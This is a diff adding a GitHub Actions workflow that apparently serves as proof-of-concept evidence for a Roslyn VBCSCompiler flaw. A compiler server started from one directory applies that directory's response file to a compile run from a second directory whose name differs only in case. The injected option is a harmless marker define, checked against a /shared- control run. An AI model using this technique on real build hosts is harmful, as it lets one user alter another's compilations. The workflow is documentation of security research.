@@ -1,0 +1,146 @@
+name: Roslyn VBCSCompiler case-colliding pipe evidence
+
+on:
+  push:
+    branches:
+      - lab/kestrel-chunk-extensions-20260920
+    paths:
+      - '.github/workflows/roslyn-vbcs-case-pipe-collision.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  linux-pipe-collision:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 10.0.401
+
+      - name: Prove case-distinct compiler directories share VBCSCompiler server state
+        shell: bash
+        run: |
+          set -euxo pipefail
+
+          ROOT="$RUNNER_TEMP/roslyn-vbcs-case-pipe"
+          ATTACKER_DIR="$ROOT/trustedcompiler"
+          TRUSTED_DIR="$ROOT/TrustedCompiler"
+          SDK_DIR="/usr/share/dotnet/sdk/10.0.401"
+          BINDIR="$SDK_DIR/Roslyn/bincore"
+          LOG="$ROOT/roslyn-client-server.log"
+
+          rm -rf "$ROOT"
+          mkdir -p "$ATTACKER_DIR" "$TRUSTED_DIR"
+
+          test -f "$BINDIR/csc.dll"
+          test -f "$BINDIR/VBCSCompiler.dll"
+
+          cp -a "$BINDIR/." "$ATTACKER_DIR/"
+          cp -a "$BINDIR/." "$TRUSTED_DIR/"
+
+          export RoslynCommandLineLogFile="$LOG"
+
+          echo "ATTACKER_DIR=$ATTACKER_DIR"
+          echo "TRUSTED_DIR=$TRUSTED_DIR"
+
+          python3 - "$ATTACKER_DIR" "$TRUSTED_DIR" <<'PY'
+          import hashlib, sys
+          a, b = sys.argv[1:]
+          print("PATHS_DISTINCT=", a != b)
+          print("LOWERCASE_IDENTITIES_EQUAL=", a.lower() == b.lower())
+          print("LOWER_A=", a.lower())
+          print("LOWER_B=", b.lower())
+          PY
+
+          cat > "$ROOT/seed.cs" <<'EOF'
+          #error SEED_REQUEST_REACHED_COMPILER
+          EOF
+
+          echo "=== Seed server from attacker case-variant compiler directory ==="
+          set +e
+          dotnet "$ATTACKER_DIR/csc.dll"             /shared             /noconfig             /nologo             /target:library             "$ROOT/seed.cs"             /out:"$ROOT/seed.dll"             >"$ROOT/seed.stdout" 2>"$ROOT/seed.stderr"
+          SEED_RC=$?
+          set -e
+          cat "$ROOT/seed.stdout"
+          cat "$ROOT/seed.stderr"
+          echo "SEED_RC=$SEED_RC"
+          grep -q "SEED_REQUEST_REACHED_COMPILER" "$ROOT/seed.stdout" "$ROOT/seed.stderr"
+
+          echo "=== Add attacker-only response file AFTER server is already running ==="
+          cat > "$ATTACKER_DIR/csc.rsp" <<'EOF'
+          /define:ATTACKER_PIPE_COLLISION
+          EOF
+
+          # Ensure the trusted compiler directory has no corresponding attacker define.
+          rm -f "$TRUSTED_DIR/csc.rsp"
+          if grep -R -q "ATTACKER_PIPE_COLLISION" "$TRUSTED_DIR"; then
+            echo "TRUSTED_DIRECTORY_PRECONDITION=FAILED"
+            exit 1
+          fi
+          echo "TRUSTED_DIRECTORY_PRECONDITION=PASS"
+
+          cat > "$ROOT/victim.cs" <<'EOF'
+          #if ATTACKER_PIPE_COLLISION
+          #error ATTACKER_RSP_APPLIED_TO_TRUSTED_CLIENT
+          #else
+          #error TRUSTED_CLIENT_DID_NOT_SEE_ATTACKER_RSP
+          #endif
+          EOF
+
+          echo "=== Compile from distinct trusted case-variant compiler directory ==="
+          set +e
+          dotnet "$TRUSTED_DIR/csc.dll"             /shared             /nologo             /target:library             "$ROOT/victim.cs"             /out:"$ROOT/victim.dll"             >"$ROOT/victim.stdout" 2>"$ROOT/victim.stderr"
+          VICTIM_RC=$?
+          set -e
+          cat "$ROOT/victim.stdout"
+          cat "$ROOT/victim.stderr"
+          echo "VICTIM_RC=$VICTIM_RC"
+
+          if grep -q "ATTACKER_RSP_APPLIED_TO_TRUSTED_CLIENT" "$ROOT/victim.stdout" "$ROOT/victim.stderr"; then
+            echo "PIPE_COLLISION_RESULT=ATTACKER_SERVER_RESPONSE_FILE_APPLIED"
+          elif grep -q "TRUSTED_CLIENT_DID_NOT_SEE_ATTACKER_RSP" "$ROOT/victim.stdout" "$ROOT/victim.stderr"; then
+            echo "PIPE_COLLISION_RESULT=ISOLATED"
+            exit 1
+          else
+            echo "PIPE_COLLISION_RESULT=UNKNOWN"
+            exit 1
+          fi
+
+          echo "=== Causal control: bypass shared compiler server ==="
+          set +e
+          dotnet "$TRUSTED_DIR/csc.dll"             /shared-             /nologo             /target:library             "$ROOT/victim.cs"             /out:"$ROOT/control.dll"             >"$ROOT/control.stdout" 2>"$ROOT/control.stderr"
+          CONTROL_RC=$?
+          set -e
+          cat "$ROOT/control.stdout"
+          cat "$ROOT/control.stderr"
+          echo "CONTROL_RC=$CONTROL_RC"
+
+          grep -q "TRUSTED_CLIENT_DID_NOT_SEE_ATTACKER_RSP" "$ROOT/control.stdout" "$ROOT/control.stderr"
+          ! grep -q "ATTACKER_RSP_APPLIED_TO_TRUSTED_CLIENT" "$ROOT/control.stdout" "$ROOT/control.stderr"
+          echo "NO_SHARED_SERVER_CONTROL=PASS"
+
+          echo "=== Roslyn client/server log ==="
+          cat "$LOG" || true
+
+          cp "$ROOT/seed.stdout" "$GITHUB_WORKSPACE/roslyn-seed.stdout"
+          cp "$ROOT/seed.stderr" "$GITHUB_WORKSPACE/roslyn-seed.stderr"
+          cp "$ROOT/victim.stdout" "$GITHUB_WORKSPACE/roslyn-victim.stdout"
+          cp "$ROOT/victim.stderr" "$GITHUB_WORKSPACE/roslyn-victim.stderr"
+          cp "$ROOT/control.stdout" "$GITHUB_WORKSPACE/roslyn-control.stdout"
+          cp "$ROOT/control.stderr" "$GITHUB_WORKSPACE/roslyn-control.stderr"
+          cp "$LOG" "$GITHUB_WORKSPACE/roslyn-client-server.log" || true
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: roslyn-vbcs-case-pipe-collision
+          path: |
+            roslyn-*.stdout
+            roslyn-*.stderr
+            roslyn-client-server.log
